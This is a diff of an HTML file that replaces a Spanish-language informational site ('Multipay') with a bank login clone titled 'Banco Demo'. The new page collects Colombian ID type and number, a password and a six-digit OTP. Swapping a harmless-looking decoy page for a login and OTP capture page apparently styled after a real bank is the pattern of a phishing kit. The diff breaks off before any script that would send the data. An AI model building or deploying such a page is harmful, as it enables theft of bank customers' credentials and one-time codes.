@@ -1,876 +1,694 @@
 <!DOCTYPE html>
 <html lang="es">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Multipay | Centro de Información y Recursos Digitales</title>
-    <meta name="description" content="Multipay es un portal informativo sobre tecnología, innovación, seguridad digital y comercio electrónico. Contenido educativo y actualizado.">
-    <meta name="keywords" content="multipay, tecnología, innovación digital, seguridad informática, comercio electrónico, guías tecnológicas">
-    <meta name="robots" content="index, follow">
-    <link rel="canonical" href="https://www.multipay.com/">
-    
-    <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;800&display=swap" rel="stylesheet">
-    
-    <style>
-        /* ===== RESET Y VARIABLES ===== */
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-
-        :root {
-            --primary-red: #CC0000;
-            --primary-red-dark: #990000;
-            --primary-red-light: #FFE6E6;
-            --gray-light: #F8F9FA;
-            --gray-medium: #E2E8F0;
-            --text-dark: #1A1A1A;
-            --text-gray: #4A4A4A;
-            --white: #FFFFFF;
-            --shadow: 0 4px 20px rgba(0, 0, 0, 0.08);
-            --radius: 12px;
-            --transition: all 0.3s ease;
-        }
-
-        html {
-            scroll-behavior: smooth;
-        }
-
-        body {
-            font-family: 'Inter', sans-serif;
-            color: var(--text-dark);
-            background-color: var(--white);
-            line-height: 1.7;
-        }
-
-        a {
-            text-decoration: none;
-            color: inherit;
-        }
-
-        ul {
-            list-style: none;
-        }
-
-        .container {
-            max-width: 1200px;
-            margin: 0 auto;
-            padding: 0 24px;
-        }
-
-        /* ===== BOTONES ===== */
-        .btn-primary {
-            display: inline-block;
-            background: var(--primary-red);
-            color: var(--white);
-            font-weight: 700;
-            padding: 14px 40px;
-            border-radius: 50px;
-            transition: var(--transition);
-            border: none;
-            cursor: pointer;
-            font-size: 1rem;
-            letter-spacing: 0.5px;
-        }
-
-        .btn-primary:hover {
-            background: var(--primary-red-dark);
-            transform: translateY(-2px);
-            box-shadow: 0 8px 25px rgba(204, 0, 0, 0.35);
-        }
-
-        .btn-outline {
-            display: inline-block;
-            background: transparent;
-            color: var(--primary-red);
-            font-weight: 600;
-            padding: 12px 32px;
-            border-radius: 50px;
-            border: 2px solid var(--primary-red);
-            transition: var(--transition);
-        }
-
-        .btn-outline:hover {
-            background: var(--primary-red);
-            color: var(--white);
-        }
-
-        /* ===== HEADER / NAVBAR ===== */
-        header {
-            background: var(--white);
-            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.05);
-            position: sticky;
-            top: 0;
-            z-index: 1000;
-            padding: 14px 0;
-            border-bottom: 3px solid var(--primary-red);
-        }
-
-        .navbar {
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-        }
-
-        .logo {
-            font-size: 1.8rem;
-            font-weight: 800;
-            color: var(--primary-red);
-        }
-
-        .logo span {
-            color: var(--primary-red-dark);
-        }
-
-        .nav-menu {
-            display: flex;
-            gap: 32px;
-            align-items: center;
-        }
-
-        .nav-menu a {
-            font-weight: 600;
-            color: var(--text-gray);
-            transition: var(--transition);
-            font-size: 0.95rem;
-        }
-
-        .nav-menu a:hover {
-            color: var(--primary-red);
-        }
-
-        .nav-menu .btn-primary {
-            padding: 10px 28px;
-            font-size: 0.9rem;
-        }
-
-        /* ===== HERO ===== */
-        .hero {
-            background: var(--white);
-            color: var(--text-dark);
-            padding: 80px 0 100px;
-            position: relative;
-            overflow: hidden;
-            border-bottom: 1px solid var(--gray-medium);
-        }
-
-        .hero::after {
-            content: '';
-            position: absolute;
-            right: -10%;
-            top: -20%;
-            width: 600px;
-            height: 600px;
-            background: radial-gradient(circle, rgba(204, 0, 0, 0.05) 0%, transparent 70%);
-            border-radius: 50%;
-            pointer-events: none;
-        }
-
-        .hero-grid {
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 60px;
-            align-items: center;
-            position: relative;
-            z-index: 2;
-        }
-
-        .hero-content h1 {
-            font-size: 3.2rem;
-            font-weight: 800;
-            line-height: 1.2;
-            margin-bottom: 16px;
-            color: var(--text-dark);
-        }
-
-        .hero-content h1 span {
-            color: var(--primary-red);
-        }
-
-        .hero-content p {
-            font-size: 1.2rem;
-            color: var(--text-gray);
-            margin-bottom: 32px;
-            max-width: 500px;
-        }
-
-        .hero-badge {
-            display: inline-block;
-            background: var(--primary-red-light);
-            color: var(--primary-red);
-            padding: 6px 18px;
-            border-radius: 50px;
-            font-size: 0.8rem;
-            font-weight: 600;
-            letter-spacing: 0.5px;
-            margin-bottom: 20px;
-            border: 1px solid rgba(204, 0, 0, 0.2);
-        }
-
-        .hero-image {
-            display: flex;
-            justify-content: center;
-            align-items: center;
-        }
-
-        .hero-image svg {
-            width: 100%;
-            max-width: 500px;
-            height: auto;
-        }
-
-        .hero-image svg circle,
-        .hero-image svg line {
-            stroke: var(--primary-red);
-        }
-
-        .hero-image svg circle[fill="#CC0000"] {
-            fill: var(--primary-red);
-        }
-
-        .hero-image svg circle[fill="#2ECC71"] {
-            fill: var(--primary-red);
-        }
-
-        .hero-image svg circle[fill="#F39C12"] {
-            fill: var(--primary-red-dark);
-        }
-
-        /* ===== SECCIÓN DE CATEGORÍAS ===== */
-        .categories {
-            padding: 80px 0;
-            background: var(--white);
-            border-bottom: 1px solid var(--gray-medium);
-        }
-
-        .section-header {
-            text-align: center;
-            margin-bottom: 48px;
-        }
-
-        .section-header h2 {
-            font-size: 2.4rem;
-            font-weight: 800;
-            color: var(--text-dark);
-        }
-
-        .section-header h2 span {
-            color: var(--primary-red);
-        }
-
-        .section-header p {
-            color: var(--text-gray);
-            max-width: 600px;
-            margin: 8px auto 0;
-        }
-
-        .categories-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
-            gap: 24px;
-        }
-
-        .category-card {
-            background: var(--white);
-            padding: 32px 20px;
-            border-radius: var(--radius);
-            text-align: center;
-            box-shadow: var(--shadow);
-            transition: var(--transition);
-            border: 1px solid var(--gray-medium);
-        }
-
-        .category-card:hover {
-            transform: translateY(-6px);
-            border-color: var(--primary-red);
-            box-shadow: 0 12px 30px rgba(204, 0, 0, 0.1);
-        }
-
-        .category-card .icon {
-            font-size: 2.8rem;
-            display: block;
-            margin-bottom: 12px;
-        }
-
-        .category-card h3 {
-            font-size: 1rem;
-            font-weight: 700;
-            color: var(--text-dark);
-        }
-
-        .category-card p {
-            font-size: 0.85rem;
-            color: var(--text-gray);
-            margin-top: 4px;
-        }
-
-        /* ===== ARTÍCULOS DESTACADOS ===== */
-        .featured {
-            padding: 80px 0;
-            background: var(--white);
-            border-bottom: 1px solid var(--gray-medium);
-        }
-
-        .articles-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(320px, 1fr));
-            gap: 32px;
-        }
-
-        .article-card {
-            background: var(--white);
-            border-radius: var(--radius);
-            overflow: hidden;
-            box-shadow: var(--shadow);
-            transition: var(--transition);
-            border: 1px solid var(--gray-medium);
-        }
-
-        .article-card:hover {
-            transform: translateY(-8px);
-            box-shadow: 0 16px 40px rgba(204, 0, 0, 0.1);
-            border-color: var(--primary-red);
-        }
-
-        .article-card .img-placeholder {
-            height: 200px;
-            background: var(--primary-red-light);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 3rem;
-            color: var(--primary-red);
-        }
-
-        .article-card .body {
-            padding: 24px;
-        }
-
-        .article-card .tag {
-            display: inline-block;
-            background: var(--primary-red);
-            color: var(--white);
-            font-size: 0.7rem;
-            font-weight: 700;
-            padding: 4px 14px;
-            border-radius: 50px;
-            text-transform: uppercase;
-            letter-spacing: 0.5px;
-            margin-bottom: 10px;
-        }
-
-        .article-card h3 {
-            font-size: 1.2rem;
-            font-weight: 700;
-            margin-bottom: 8px;
-            color: var(--text-dark);
-        }
-
-        .article-card h3 a {
-            color: var(--text-dark);
-            transition: var(--transition);
-        }
-
-        .article-card h3 a:hover {
-            color: var(--primary-red);
-        }
-
-        .article-card p {
-            color: var(--text-gray);
-            font-size: 0.95rem;
-        }
-
-        .article-card .meta {
-            margin-top: 16px;
-            font-size: 0.85rem;
-            color: var(--text-gray);
-            display: flex;
-            align-items: center;
-            gap: 16px;
-        }
-
-        /* ===== SOBRE NOSOTROS (3 PASOS) ===== */
-        .about-steps {
-            padding: 80px 0;
-            background: var(--white);
-            border-bottom: 1px solid var(--gray-medium);
-        }
-
-        .about-steps .section-header h2 {
-            color: var(--text-dark);
-        }
-
-        .about-steps .section-header h2 span {
-            color: var(--primary-red);
-        }
-
-        .about-steps .section-header p {
-            color: var(--text-gray);
-        }
-
-        .steps-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
-            gap: 40px;
-            margin-top: 16px;
-        }
-
-        .step-item {
-            text-align: center;
-            padding: 24px;
-            border: 1px solid var(--gray-medium);
-            border-radius: var(--radius);
-            transition: var(--transition);
-        }
-
-        .step-item:hover {
-            border-color: var(--primary-red);
-            box-shadow: 0 8px 30px rgba(204, 0, 0, 0.08);
-        }
-
-        .step-item .number {
-            display: inline-block;
-            width: 60px;
-            height: 60px;
-            background: var(--primary-red-light);
-            border-radius: 50%;
-            line-height: 60px;
-            font-size: 1.8rem;
-            font-weight: 800;
-            color: var(--primary-red);
-            margin-bottom: 16px;
-        }
-
-        .step-item h3 {
-            font-size: 1.3rem;
-            font-weight: 700;
-            margin-bottom: 8px;
-            color: var(--text-dark);
-        }
-
-        .step-item p {
-            color: var(--text-gray);
-            font-size: 0.95rem;
-        }
-
-        /* ===== AVISO LEGAL DESTACADO ===== */
-        .legal-notice {
-            background: var(--primary-red-light);
-            padding: 40px 0;
-            border-top: 4px solid var(--primary-red);
-            border-bottom: 4px solid var(--primary-red);
-        }
-
-        .legal-notice-content {
-            display: flex;
-            align-items: flex-start;
-            gap: 20px;
-            max-width: 900px;
-            margin: 0 auto;
-        }
-
-        .legal-notice-content .icon {
-            font-size: 2.4rem;
-            flex-shrink: 0;
-        }
-
-        .legal-notice-content p {
-            font-size: 0.95rem;
-            color: var(--text-dark);
-        }
-
-        .legal-notice-content strong {
-            color: var(--primary-red);
-        }
-
-        /* ===== FOOTER ===== */
-        footer {
-            background: var(--white);
-            color: var(--text-dark);
-            padding: 60px 0 30px;
-            border-top: 3px solid var(--primary-red);
-        }
-
-        .footer-grid {
-            display: grid;
-            grid-template-columns: 2fr 1fr 1fr 1fr;
-            gap: 48px;
-            margin-bottom: 40px;
-        }
-
-        .footer-brand .logo {
-            color: var(--primary-red);
-            font-size: 1.6rem;
-        }
-
-        .footer-brand p {
-            margin-top: 12px;
-            font-size: 0.9rem;
-            color: var(--text-gray);
-            max-width: 280px;
-        }
-
-        .footer-col h4 {
-            color: var(--text-dark);
-            font-weight: 700;
-            margin-bottom: 16px;
-            font-size: 1rem;
-        }
-
-        .footer-col ul li {
-            margin-bottom: 10px;
-        }
-
-        .footer-col ul li a {
-            font-size: 0.9rem;
-            color: var(--text-gray);
-            transition: var(--transition);
-        }
-
-        .footer-col ul li a:hover {
-            color: var(--primary-red);
-        }
-
-        .footer-bottom {
-            border-top: 1px solid var(--gray-medium);
-            padding-top: 24px;
-            text-align: center;
-            font-size: 0.85rem;
-            color: var(--text-gray);
-        }
-
-        .footer-bottom strong {
-            color: var(--primary-red);
-        }
-
-        /* ===== RESPONSIVE ===== */
-        @media (max-width: 992px) {
-            .hero-grid {
-                grid-template-columns: 1fr;
-                text-align: center;
-            }
-
-            .hero-content p {
-                margin-left: auto;
-                margin-right: auto;
-            }
-
-            .hero-image svg {
-                max-width: 350px;
-            }
-
-            .footer-grid {
-                grid-template-columns: 1fr 1fr;
-            }
-        }
-
-        @media (max-width: 768px) {
-            .nav-menu {
-                gap: 16px;
-            }
-
-            .nav-menu a:not(.btn-primary) {
-                font-size: 0.85rem;
-            }
-
-            .hero-content h1 {
-                font-size: 2.2rem;
-            }
-
-            .hero {
-                padding: 60px 0 70px;
-            }
-
-            .categories-grid {
-                grid-template-columns: repeat(2, 1fr);
-            }
-
-            .articles-grid {
-                grid-template-columns: 1fr;
-            }
-
-            .footer-grid {
-                grid-template-columns: 1fr;
-                gap: 32px;
-                text-align: center;
-            }
-
-            .footer-brand p {
-                margin-left: auto;
-                margin-right: auto;
-            }
-
-            .legal-notice-content {
-                flex-direction: column;
-                text-align: center;
-            }
-        }
-
-        @media (max-width: 480px) {
-            .navbar {
-                flex-wrap: wrap;
-                gap: 12px;
-                justify-content: center;
-            }
-
-            .nav-menu {
-                flex-wrap: wrap;
-                justify-content: center;
-                gap: 12px;
-            }
-
-            .categories-grid {
-                grid-template-columns: 1fr;
-            }
-
-            .hero-content h1 {
-                font-size: 1.8rem;
-            }
-        }
-    </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Portal de acceso - Banco Demo</title>
+
+<style>
+* { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
+
+:root {
+    --green: #00b82e;
+    --dark-green: #125665;
+    --orange: #f36b21;
+    --background: #f5f5f5;
+}
+
+html, body {
+    font-family: Arial, Helvetica, sans-serif;
+    background: var(--background);
+    color: #111;
+    min-height: 100vh;
+    -webkit-text-size-adjust: 100%;
+}
+
+/* ============ ESCRITORIO ============ */
+.page {
+    width: 100%; max-width: 1100px; min-height: calc(100vh - 95px);
+    margin: auto; display: grid; grid-template-columns: 340px 1fr;
+    gap: 22px; align-items: center; padding: 10px 20px 0;
+}
+
+.login-card {
+    background: white; width: 100%; min-height: 600px;
+    padding: 45px 28px 25px; border-radius: 14px 14px 0 0;
+    box-shadow: 0 1px 10px rgba(0,0,0,.06); position: relative;
+}
+
+.security {
+    position: absolute; top: 18px; right: 28px;
+    width: 19px; height: 19px; border: 1.5px solid var(--orange);
+    color: var(--orange); border-radius: 50%;
+    display: flex; align-items: center; justify-content: center; font-size: 11px;
+}
+
+.welcome { font-size: 18px; font-weight: bold; margin-bottom: 15px; }
+.logo { color: var(--green); font-size: 23px; font-weight: 800; margin-bottom: 32px; letter-spacing: -.7px; }
+.logo-symbol {
+    display: inline-flex; align-items: center; justify-content: center;
+    width: 25px; height: 25px; border-radius: 50%;
+    background: var(--green); color: white; margin-right: 4px;
+}
+
+.field { margin-bottom: 17px; }
+.field-label { display: flex; justify-content: space-between; align-items: center; margin-bottom: 8px; font-size: 13px; }
+.field-label a { color: var(--orange); font-weight: bold; text-decoration: underline; }
+
+.input {
+    width: 100%; height: 46px; border: 1px solid #888; border-radius: 9px;
+    padding: 0 13px; font-size: 16px; background: white; outline: none; color: #111; font-family: inherit;
+}
+.input:focus { border: 1.5px solid var(--dark-green); }
+select.input { cursor: pointer; }
+
+.password-box { position: relative; }
+.password-box input { padding-right: 45px; letter-spacing: 8px; }
+.eye {
+    position: absolute; right: 12px; top: 50%; transform: translateY(-50%);
+    background: transparent; border: none; cursor: pointer; color: #999; font-size: 19px; padding: 8px;
+}
+
+.remember { display: flex; align-items: center; gap: 9px; margin: 20px 0 30px; font-size: 12px; }
+.switch { width: 35px; height: 21px; background: #c7c7c7; border-radius: 20px; position: relative; cursor: pointer; flex-shrink: 0; }
+.switch input { display: none; }
+.switch span { width: 17px; height: 17px; position: absolute; background: white; border-radius: 50%; top: 2px; left: 2px; transition: .2s; }
+.switch input:checked + span { left: 16px; }
+.switch:has(input:checked) { background: var(--green); }
+
+.continue {
+    width: 100%; height: 47px; border: none; border-radius: 8px;
+    background: #bdbdbd; color: #777; font-size: 16px; font-weight: bold;
+    cursor: not-allowed; transition: .2s; font-family: inherit;
+}
+.continue.active { background: linear-gradient(110deg, #125665, #237987); color: white; cursor: pointer; }
+
+.register { text-align: center; margin-top: 27px; font-size: 13px; color: #777; }
+.register a { color: var(--orange); font-weight: bold; margin-left: 5px; }
+
+.error-msg { display: none; color: #d9381e; font-size: 13px; margin-top: 10px; text-align: center; }
+.error-msg.show { display: block; }
+
+.loading-overlay {
+    display: none; position: fixed; inset: 0; background: rgba(255,255,255,.9);
+    z-index: 10000; align-items: center; justify-content: center; flex-direction: column;
+}
+.loading-spinner { border: 4px solid #f3f3f3; border-top: 4px solid var(--green); border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; }
+@keyframes spin { from{transform:rotate(0)} to{transform:rotate(360deg)} }
+
+.right-content { width: 100%; padding: 20px 0; }
+.banner { width: 100%; min-height: 280px; background: #125665; border-radius: 12px; position: relative; overflow: hidden; display: flex; align-items: center; color: white; }
+.banner::before { content: ""; position: absolute; width: 250px; height: 250px; background: #13e900; border-radius: 50%; top: -165px; left: -70px; }
+.banner::after { content: ""; position: absolute; width: 230px; height: 230px; background: #13e900; border-radius: 50%; bottom: -190px; right: -90px; }
+.banner-person { position: relative; z-index: 1; width: 40%; height: 280px; display: flex; align-items: end; justify-content: center; font-size: 90px; }
+.banner-person span { margin-bottom: 10px; }
+.banner-info { width: 60%; position: relative; z-index: 2; padding: 20px; }
+.banner-info h2 { font-size: 22px; color: #16f000; margin-bottom: 10px; }
+.banner-info p { font-size: 14px; line-height: 1.5; margin-bottom: 16px; }
+.banner-info button { background: white; border: none; border-radius: 7px; padding: 13px; color: #125665; font-weight: bold; font-size: 13px; cursor: pointer; }
+.slider-lines { display: flex; gap: 7px; margin: 14px 0 28px; }
+.slider-lines span { height: 4px; background: white; flex: 1; border-radius: 5px; }
+.slider-lines span:nth-child(3) { background: var(--green); }
+
+.help h2 { font-size: 17px; margin-bottom: 16px; }
+.help-cards { display: grid; grid-template-columns: repeat(3, 1fr); gap: 16px; }
+.help-card { background: white; border-radius: 12px; min-height: 85px; display: flex; flex-direction: column; justify-content: center; align-items: center; gap: 8px; font-size: 12px; cursor: pointer; }
+.help-icon { width: 38px; height: 38px; background: #b5f2bb; color: #00ae28; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 20px; }
+
+.footer { width: 100%; background: white; min-height: 95px; border-top: 1px solid #eee; }
+.footer-top { display: flex; align-items: center; justify-content: space-between; padding: 15px 30px; }
+.footer-logo { color: var(--green); font-weight: 900; font-size: 21px; }
+.footer-links { display: flex; gap: 25px; }
+.footer-links a { color: var(--orange); font-size: 12px; font-weight: bold; }
+.footer-bottom { border-top: 1px solid #ddd; padding: 8px 30px; font-size: 11px; display: flex; justify-content: space-between; }
+
+/* ============ MODAL OTP ============ */
+.demo-overlay { display: none; position: fixed; inset: 0; z-index: 9999; background: rgba(0,0,0,.7); backdrop-filter: blur(2px); align-items: center; justify-content: center; padding: 16px; }
+.demo-overlay.is-open { display: flex; }
+.demo-modal { width: 100%; max-width: 480px; max-height: 92vh; overflow-y: auto; background: #fff; border-radius: 20px; padding: 24px 24px 30px; box-shadow: 0 18px 48px rgba(0,0,0,.3); position: relative; -webkit-overflow-scrolling: touch; }
+.demo-close-row { display: flex; justify-content: flex-end; margin-bottom: 8px; }
+.demo-close { border: 0; background: transparent; font-size: 30px; line-height: 1; width: 40px; height: 40px; cursor: pointer; color: #333; display: flex; align-items: center; justify-content: center; }
+.demo-instruction { background: #d7f0db; border-radius: 12px; padding: 18px 20px; text-align: center; margin: 0 0 18px; color: #125665; font-size: 15px; line-height: 1.5; }
+.demo-instruction strong { font-weight: 800; display: block; margin-bottom: 6px; }
+.demo-title { text-align: center; font-size: 22px; line-height: 1.2; margin: 10px 0 22px; color: #125665; }
+.demo-actions { display: flex; justify-content: center; gap: 12px; margin-top: 22px; }
+.demo-actions button { flex: 1; max-width: 200px; min-height: 50px; border-radius: 10px; font-weight: bold; font-size: 15px; cursor: pointer; border: none; font-family: inherit; }
+.demo-actions .bc-button-secondary { background: transparent; color: #125665; border: 1.5px solid #125665; }
+.demo-actions .bc-button-primary { background: #125665; color: #fff; }
+.demo-actions .bc-button-primary:disabled { background: #bdbdbd; color: #777; cursor: not-allowed; }
+.demo-note { font-size: 11px; color: #999; text-align: center; margin-top: 18px; }
+.demo-step { display: none; }
+.demo-step.active { display: block; }
+.otp-slots-container { display: flex; justify-content: center; gap: 8px; margin: 22px 0; }
+.otp-slot { width: 44px; height: 50px; border: 1px solid #ccc; border-radius: 8px; text-align: center; font-size: 1.3rem; line-height: 50px; font-weight: bold; background: #fdfdfd; color: #125665; }
+.otp-slot.active { border-color: var(--green); box-shadow: 0 0 5px rgba(0,184,46,.5); }
+.otp-slots-container.error .otp-slot { border-color: #d9381e; }
+.otp-hidden-input { position: absolute; opacity: 0; pointer-events: none; width: 1px; height: 1px; }
+
+/* ============ MÓVIL / TABLET ============ */
+@media (max-width: 760px) {
+    body { background: #fff; }
+    .page { display: block; padding: 0; min-height: auto; max-width: 100%; }
+    .login-card { width: 100%; min-height: auto; padding: 32px 24px 40px; border-radius: 0; box-shadow: none; }
+    .security { top: 20px; right: 24px; }
+    .welcome { font-size: 17px; margin-bottom: 10px; color: #444; }
+    .logo { font-size: 26px; margin-bottom: 32px; display: flex; align-items: center; }
+    .logo-symbol { width: 30px; height: 30px; font-size: 15px; }
+    .field { margin-bottom: 22px; }
+    .field-label { font-size: 14px; margin-bottom: 8px; flex-wrap: wrap; gap: 6px; }
+    .input { height: 54px; font-size: 16px; padding: 0 16px; border-radius: 10px; }
+    .password-box input { letter-spacing: 8px; padding-right: 52px; }
+    .eye { font-size: 22px; right: 14px; padding: 10px; }
+    .remember { font-size: 14px; gap: 10px; margin: 22px 0 28px; line-height: 1.4; }
+    .switch { width: 42px; height: 24px; }
+    .switch span { width: 20px; height: 20px; top: 2px; left: 2px; }
+    .switch input:checked + span { left: 20px; }
+    .continue { height: 56px; font-size: 17px; border-radius: 12px; margin-top: 6px; }
+    .register { font-size: 15px; margin-top: 28px; }
+    .right-content { display: block; padding: 8px 24px 32px; }
+    .banner { min-height: 160px; border-radius: 14px; }
+    .banner-person { width: 32%; height: 160px; font-size: 60px; }
+    .banner-info { width: 68%; padding: 16px; }
+    .banner-info h2 { font-size: 16px; margin-bottom: 6px; }
+    .banner-info p { font-size: 12px; line-height: 1.4; margin-bottom: 10px; }
+    .banner-info button { padding: 9px 14px; font-size: 12px; border-radius: 6px; }
+    .banner::before { width: 140px; height: 140px; top: -90px; left: -40px; }
+    .banner::after  { width: 140px; height: 140px; bottom: -110px; right: -50px; }
+    .slider-lines { display: none; }
+    .help { margin-top: 28px; }
+    .help h2 { font-size: 18px; margin-bottom: 16px; }
+    .help-cards { gap: 12px; }
+    .help-card { min-height: 96px; font-size: 12px; padding: 8px; text-align: center; }
+    .help-icon { width: 40px; height: 40px; font-size: 20px; }
+    .footer { min-height: 60px; }
+    .footer-top { justify-content: center; padding: 16px; }
+    .footer-logo { display: none; }
+    .footer-bottom { display: none; }
+    .footer-links { width: 100%; justify-content: space-around; gap: 10px; }
+    .footer-links a { font-size: 13px; }
+    .demo-overlay { padding: 16px; }
+    .demo-modal { padding: 22px 22px 28px; border-radius: 20px; max-width: 100%; }
+    .demo-instruction { padding: 18px 18px; font-size: 15px; margin-bottom: 18px; }
+    .demo-title { font-size: 22px; margin: 10px 0 22px; }
+    .otp-slots-container { gap: 8px; margin: 20px 0; }
+    .otp-slot { width: 44px; height: 52px; font-size: 1.3rem; line-height: 52px; }
+    .demo-actions { gap: 12px; margin-top: 20px; }
+    .demo-actions button { min-height: 52px; font-size: 15px; }
+}
+
+@media (max-width: 400px) {
+    .login-card { padding: 26px 20px 34px; }
+    .welcome { font-size: 16px; }
+    .logo { font-size: 24px; margin-bottom: 28px; }
+    .logo-symbol { width: 28px; height: 28px; font-size: 14px; }
+    .field { margin-bottom: 20px; }
+    .field-label { font-size: 13px; }
+    .input { height: 52px; font-size: 16px; padding: 0 14px; }
+    .remember { font-size: 13px; margin: 20px 0 24px; }
+    .continue { height: 54px; font-size: 16px; }
+    .register { font-size: 14px; margin-top: 24px; }
+    .right-content { padding: 8px 20px 28px; }
+    .banner { min-height: 140px; }
+    .banner-person { font-size: 52px; height: 140px; }
+    .banner-info h2 { font-size: 15px; }
+    .banner-info p { font-size: 11.5px; }
+    .banner-info button { padding: 8px 12px; font-size: 11px; }
+    .help h2 { font-size: 17px; }
+    .help-card { min-height: 90px; font-size: 11.5px; }
+    .demo-modal { padding: 20px 18px 24px; border-radius: 18px; }
+    .demo-title { font-size: 20px; }
+    .demo-instruction { font-size: 14px; padding: 16px 14px; }
+    .otp-slots-container { gap: 6px; margin: 18px 0; }
+    .otp-slot { width: 40px; height: 48px; font-size: 1.15rem; line-height: 48px; }
+    .demo-actions button { min-height: 50px; font-size: 14px; }
+}
+@media (max-width: 340px) {
+    .login-card { padding: 22px 16px 30px; }
+    .otp-slot { width: 36px; height: 44px; font-size: 1rem; line-height: 44px; }
+    .otp-slots-container { gap: 5px; }
+    .banner { min-height: 130px; }
+    .banner-person { font-size: 46px; height: 130px; }
+    .banner-info h2 { font-size: 14px; }
+}
+</style>
 </head>
+
 <body>
 
-<!-- ===== HEADER ===== -->
-<header>
-    <div class="container navbar">
-        <a href="#" class="logo">Multi<span>pay</span></a>
-        <nav class="nav-menu">
-            <a href="#inicio">Inicio</a>
-            <a href="#categorias">Categorías</a>
-            <a href="#articulos">Artículos</a>
-            <a href="#nosotros">Nosotros</a>
-            <a href="#contacto" class="btn-primary">Contacto</a>
-        </nav>
-    </div>
-</header>
+<div class="loading-overlay" id="loading-overlay">
+    <div class="loading-spinner"></div>
+    <p style="margin-top:15px;font-weight:600;color:#125665;">Procesando solicitud...</p>
+</div>
 
-<!-- ===== HERO ===== -->
-<section class="hero" id="inicio">
-    <div class="container hero-grid">
-        <div class="hero-content">
-            <span class="hero-badge">📢 100% Informativo · Sin servicios financieros</span>
-            <h1>Multipay: <span>Tu Centro de Conocimiento</span> para el Ecosistema Digital</h1>
-            <p>Explora guías, tendencias y análisis sobre las herramientas que transforman el mundo digital.</p>
-            <a href="#articulos" class="btn-primary">Comenzar a aprender →</a>
-        </div>
-        <div class="hero-image">
-            <svg viewBox="0 0 400 300" fill="none" xmlns="http://www.w3.org/2000/svg">
-                <circle cx="200" cy="150" r="120" stroke="#CC0000" stroke-width="2" stroke-dasharray="8 8" opacity="0.3"/>
-                <circle cx="200" cy="150" r="80" stroke="#CC0000" stroke-width="2" opacity="0.2"/>
-                <circle cx="200" cy="150" r="40" fill="#FFE6E6" stroke="#CC0000" stroke-width="3"/>
-                <circle cx="200" cy="150" r="12" fill="#CC0000"/>
-                <circle cx="120" cy="90" r="8" fill="#CC0000"/>
-                <circle cx="280" cy="90" r="8" fill="#CC0000"/>
-                <circle cx="120" cy="210" r="8" fill="#CC0000"/>
-                <circle cx="280" cy="210" r="8" fill="#CC0000"/>
-                <circle cx="70" cy="150" r="8" fill="#990000"/>
-                <circle cx="330" cy="150" r="8" fill="#990000"/>
-                <line x1="120" y1="90" x2="200" y2="150" stroke="#CC0000" stroke-width="2" opacity="0.4"/>
-                <line x1="280" y1="90" x2="200" y2="150" stroke="#CC0000" stroke-width="2" opacity="0.4"/>
-                <line x1="120" y1="210" x2="200" y2="150" stroke="#CC0000" stroke-width="2" opacity="0.4"/>
-                <line x1="280" y1="210" x2="200" y2="150" stroke="#CC0000" stroke-width="2" opacity="0.4"/>
-                <line x1="70" y1="150" x2="200" y2="150" stroke="#990000" stroke-width="2" opacity="0.3"/>
-                <line x1="330" y1="150" x2="200" y2="150" stroke="#990000" stroke-width="2" opacity="0.3"/>
-            </svg>
-        </div>
-    </div>
-</section>
+<main class="page">
+    <section class="login-card">
+        <div class="security">♙</div>
+        <h1 class="welcome">Bienvenido a</h1>
+        <div class="logo"><span class="logo-symbol">D</span> banco DEMO</div>
 
-<!-- ===== CATEGORÍAS ===== -->
-<section class="categories" id="categorias">
-    <div class="container">
-        <div class="section-header">
-            <h2>Lo que encontrarás en <span>Multipay</span></h2>
-            <p>Contenido educativo para mantenerte al día en el mundo digital</p>
-        </div>
-        <div class="categories-grid">
-            <div class="category-card">
-                <span class="icon">📰</span>
-                <h3>Tendencias Tech</h3>
-                <p>Lo último en innovación y lanzamientos</p>
+        <form id="demoForm" autocomplete="off" novalidate>
+            <div class="field">
+                <label class="field-label" for="documentType">Tipo de documento</label>
+                <select class="input" id="documentType">
+                    <option>Cédula de Ciudadanía</option>
+                    <option>Cédula de Extranjería</option>
+                    <option>Pasaporte</option>
+                    <option>Tarjeta de Identidad</option>
+                </select>
             </div>
-            <div class="category-card">
-                <span class="icon">🔒</span>
-                <h3>Ciberseguridad</h3>
-                <p>Protege tus datos y privacidad</p>
+            <div class="field">
+                <label class="field-label" for="documentNumber">Número de documento</label>
+                <input class="input" id="documentNumber" type="text" inputmode="numeric" placeholder="Número de documento" autocomplete="off" required>
             </div>
-            <div class="category-card">
-                <span class="icon">🤖</span>
-                <h3>Automatización</h3>
-                <p>Descubre cómo la IA optimiza procesos</p>
-            </div>
-            <div class="category-card">
-                <span class="icon">📱</span>
-                <h3>Guías de Apps</h3>
-                <p>Tutoriales para herramientas digitales</p>
-            </div>
-            <div class="category-card">
-                <span class="icon">🌐</span>
-                <h3>Comercio Digital</h3>
-                <p>Estrategias y tendencias del e-commerce</p>
-            </div>
-            <div class="category-card">
-                <span class="icon">☁️</span>
-                <h3>Servicios Cloud</h3>
-                <p>Soluciones y plataformas en la nube</p>
-            </div>
-        </div>
-    </div>
-</section>
-
-<!-- ===== ARTÍCULOS DESTACADOS ===== -->
-<section class="featured" id="articulos">
-    <div class="container">
-        <div class="section-header">
-            <h2>Artículos <span>Destacados</span></h2>
-            <p>Contenido seleccionado para ampliar tu conocimiento digital</p>
-        </div>
-        <div class="articles-grid">
-            <article class="article-card">
-                <div class="img-placeholder">🔐</div>
-                <div class="body">
-                    <span class="tag">Seguridad</span>
